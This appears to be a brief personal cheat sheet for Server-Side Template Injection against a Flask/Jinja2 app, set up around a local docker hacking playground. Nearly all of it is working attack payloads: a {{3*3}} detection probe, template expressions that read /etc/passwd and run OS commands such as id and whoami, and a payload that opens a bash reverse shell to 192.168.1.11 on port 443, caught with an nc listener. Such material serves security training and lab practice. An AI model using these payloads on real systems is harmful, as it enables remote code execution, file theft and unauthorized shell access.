# SSTI
```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground

localhost:8089
whatweb http://127.0.0.1:8089/

# put into username {{3*3}} = 9 (only for pyrhon and flask)
# we get 9 as response -> proof of SSTI

# try to get server info
{{request.environ}}

payloadsallthethings # trick to view vulns

https://swisskyrepo.github.io/PayloadsAllTheThings/

{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.11/443 0>&1"').read() }}

nc -lvnp 443

```